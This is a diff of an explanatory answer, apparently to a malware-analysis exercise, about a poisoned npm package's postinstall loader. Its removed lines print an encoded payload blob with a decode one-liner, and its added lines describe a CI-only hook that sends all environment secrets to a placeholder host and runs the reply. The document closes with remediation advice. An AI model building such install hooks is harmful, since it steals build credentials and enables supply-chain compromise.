@@ -1,18 +1,20 @@
-The answer is `https://api.tokenvault-update.invalid/stage2.bin`.
+The answer is `https://pkg.ansi-tint-mirror.invalid/v2/linux-x64/helper`.
 
-The string is base64, and the decoded bytes are XORed with the single-byte key `0x2b`. In a shell:
+`index.js` is the real package and does what it says. The new file is `scripts/postinstall.js`, which `package.json` runs on every install, before anyone imports anything. It XORs a base64 string with a repeating key, and the key is `pkg.name`, the package's own name: `ansi-tint`. You can't decode it from that one file, which is the idea.
 
 ```bash
-echo 'TU5fSEMDCUNfX1tYEQQESltCBV9EQE5FXUpeR18GXltPSl9OBUJFXUpHQk8EWF9KTE4ZBUlCRQkCBV9DTkUDWRYVWQVKWVlKUmleTU1OWQMCAgVfQ05FA0kWFU5dSkcDRU5cC39OU19vTkhET05ZAwIFT05IRE9OA0kCAgI=' \
-  | base64 -d | python3 -c 'import sys; print(bytes(b ^ 0x2b for b in sys.stdin.buffer.read()).decode())'
+python3 - <<'PY'
+import base64, re
+src = open("scripts/postinstall.js").read()
+blob = "".join(re.findall(r'"([A-Za-z0-9+/=]{20,})"', src))
+key = b"ansi-tint"
+data = base64.b64decode(blob)
+print(bytes(b ^ key[i % len(key)] for i, b in enumerate(data)).decode())
+PY
 ```
 
-The decoded text downloads a second file and passes it straight to `eval`. That is the actual malware, and it is not in the package at all, so a scan of the published source finds nothing.
+The decoded code picks a host by platform. Windows and macOS get their own, and anything else falls through to `pkg.ansi-tint-mirror.invalid`. The path is `/v2/`, then `process.platform`, a dash, and `os.arch()`. On an Ubuntu runner those are `linux` and `x64`. Node calls x86-64 `x64`, not `amd64` or `x86_64`.
 
-Things worth noticing in the loader itself:
+Two other details are why anyone would bother. It only runs when `CI` or `GITHUB_ACTIONS` is set, so a developer installing it on their laptop never sees anything happen, and it goes off on every CI run. And it sends all of `process.env`, base64-encoded, in an `x-e` header. On a build runner, the environment is where the secrets live: deploy keys, cloud credentials, and the npm token you'd need to publish the next poisoned package. Then it runs whatever the server sends back.
 
-- **`process.env.CI !== "true"`.** It skips execution in CI, so automated test runs and many sandboxes never see the behavior.
-- **`new Function(...)`.** An `eval` alternative, used so that the decoded string is never visible in the source.
-- **A postinstall hook.** The code runs at install time, before anyone has imported the package.
-
-Single-byte XOR plus base64 is not meant to resist analysis. It only defeats string searches for the URL.
+Several real npm compromises in 2025 worked much like this. If it had been your runner, removing the package wouldn't be the fix. Rotate every secret that build could see, then pin your dependencies and use `npm ci --ignore-scripts` wherever the build doesn't need install scripts.
